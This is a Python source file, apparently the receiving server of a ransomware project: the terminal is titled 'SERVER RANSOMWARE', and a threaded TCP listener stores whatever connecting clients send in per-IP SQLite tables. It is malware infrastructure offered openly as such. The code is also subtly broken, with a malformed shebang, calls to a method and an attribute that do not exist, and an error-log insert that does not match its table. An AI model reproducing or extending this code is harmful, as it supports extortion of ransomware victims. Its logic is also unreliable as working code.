#!user/bin/env python3
# Import modules
import os
import sys
import sqlite3
import datetime
from time import sleep, time
from threading import Thread
from modules.color import System, Col
from socket import socket, AF_INET, SOCK_STREAM

# Lớp Server để xử lý các kết nối và truyền dữ liệu
class Server:
    def __init__(self, HOST: str, PORT: int) -> None:
        self.host: str = HOST
        self.port: int = PORT
        self.logserver = SqliteLog()
        self.server = socket(AF_INET, SOCK_STREAM)
        self.client_connect_time = {}  # Lưu thời gian kết nối của mỗi client

    # Xử lý dữ liệu từ mỗi client
    def HandleClient(self, client, address) -> None:
        connect_time = time()  # Thời điểm bắt đầu kết nối
        self.client_connect_time[address[0]] = connect_time
        while True:
            try:
                data = client.recv(4096)
                if not data:
                    break
                if not isinstance(data, bytes): 
                    data = data.encode('utf-8')
                self.logserver.activity(address[0], data)
                Console(address[0], round(len(data)/1024, 3), 1)
            except Exception as error:
                Console(address[0], error, 3)
                self.logserver.error(error)
                break
        client.close()
        disconnect_time = time()  # Thời điểm ngắt kết nối
        self.Connection_time(address[0], connect_time, disconnect_time)

    # Xử lý các kết nối đến server
    def HandleConnections(self) -> None:
        while True:
            client, address = self.server.accept()
            Console(address[0], None, 0)
            thread = Thread(target=self.HandleClient, args=(client, address))
            thread.start()

    # Tính toán thời gian kết nối của mỗi client
    def Connection_time(self, ip, connect, disconnect) -> None:
        if ip in self.client_connect_time:
            connection_time = disconnect - connect
            Console(ip, f'Disconnect.  {connection_time:.2f} seconds', 2)
            del self.client_connect_time[ip]

    # Bắt đầu lắng nghe các kết nối đến server
    def Listening(self) -> None:
        try:
            self.server.bind((self.host, self.port))
            self.server.listen()
            Console('SYSTEM', 'The server starts listening', 2)
            thread = Thread(target=self.HandleConnections)
            thread.start()
        except OSError as error:
            Console('ERROR', 'Address already in use', 3)
            self.logserver.error(error)

# Lớp SqliteLog để lưu trữ các hoạt động và lỗi vào cơ sở dữ liệu SQLite
class SqliteLog:
    def __init__(self) -> None:
        self.conn = None
        self.cursor = None

    # Kết nối đến cơ sở dữ liệu
    def connect(self) -> None:
        if not os.path.exists('data'):
            os.makedirs('data')
        self.conn = sqlite3.connect(f'data/server.db')
        self.cursor = self.conn.cursor()

    # Đóng kết nối đến cơ sở dữ liệu
    def close(self) -> None:
        if self.conn:
            self.conn.close()

    # Tạo bảng trong cơ sở dữ liệu
    def createTable(self, table_name) -> None:
        self.cursor.execute(f'''
                CREATE TABLE IF NOT EXISTS {table_name} (
                    activity TEXT,
                    timestamp TEXT
                )
            ''')
        self.conn.commit()

    # Ghi hoạt động của mỗi IP vào cơ sở dữ liệu
    def activity(self, IP: str, activity: str) -> None:
        try:
            self.connect()
            IP = IP.replace('.', '_')
            self.createTable(f'IP_{IP}')
            timestamp = datetime.datetime.now().strftime('%m-%d %H:%M:%S')
            self.cursor.execute(f'''
                INSERT INTO IP_{IP} (activity, timestamp) VALUES (?, ?)
            ''', (activity, timestamp))
            self.conn.commit()
        except Exception as error:
           Console('ERROR', str(error), 3)
           self.logserver.error(error)
        finally:
            self.close()

    # Ghi lỗi vào cơ sở dữ liệu
    def error(self, message: str) -> None:
        try:
            self.connect()
            self.create_table('error_log')
            timestamp = datetime.datetime.now().strftime('%m-%d %H:%M:%S')
            self.cursor.execute('''
                INSERT INTO error_log (timestamp, message) VALUES (?, ?)
            ''', (timestamp, message))
            self.conn.commit()
        except Exception as error:
            Console('ERROR', str(error), 3)
            self.logserver.error(error)
        finally:
            self.close()

    # Đóng kết nối đến cơ sở dữ liệu
    def close(self) -> None:
        if self.conn:
            self.conn.close()

# Hàm Console để in thông điệp ra console 
def Console(ip: str, msg: str, select) -> None:
    messages = {
        0: f" [{Col.Pink}{ip}{Col.White}] --> {Col.Green}Connect to the Server{Col.White}.",
        1: f" [{Col.Pink}{ip}{Col.White}] --> {Col.Yellow}Packet data: {msg} KB{Col.White}.",
        2: f" [{Col.Pink}{ip}{Col.White}] --> {Col.Purple}{msg}{Col.White}.",
        3: f" [{Col.Pink}{ip}{Col.White}] --> {Col.Red}{msg}{Col.White}."
    }
    print(messages.get(select, f" [{Col.Pink}{ip}{Col.White}] --> Unknown message: {msg}"))

# Hàm main để khởi tạo server và bắt đầu lắng nghe các kết nối
if __name__ == '__main__':
    try:
        Terminal = System()
        Terminal.clear()
        Terminal.title('SERVER RANSOMWARE')
        Terminal.size(320, 240)
        Terminal.init()
        Server('192.168.1.12', 19100).Listening()
    except Exception as error:
        Console('ERROR', error, 3)
        sleep(10)
        os.execv(sys.executable, [sys.executable] + sys.argv)

